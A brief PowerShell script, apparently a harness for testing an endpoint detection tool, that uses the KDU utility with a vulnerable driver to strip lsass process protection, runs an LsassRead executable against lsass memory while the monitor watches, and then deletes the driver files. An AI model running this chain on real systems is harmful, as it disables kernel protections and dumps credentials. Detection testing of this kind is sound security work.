$r = $PSScriptRoot
$s = "$r\LsassRead\LsassRead.exe"
$p = "C:\Users\Public\Downloads\LsassRead.exe"

if (Test-Path $p) {
	rm $p -Force
}

# strip lsass PPL
Start-Process "$r\LsassRead\kdu.exe" -Args "-ps $((Get-Process lsass).Id) -prv 54" -NoNewWindow

# start monitor
Start-Process "$r\..\iEDR.exe" -Args "-a $p"

$_= Read-Host "Wait for iEDR startup..."

cp $s $p
Write-Host "Copied $s to $p"
Read-Host "Press ENTER to start $p"
Start-Process $p -NoNewWindow -Wait

# KDU cleanup
rm "NeacSafe64.inf"
rm "NeacSafe64.sys"
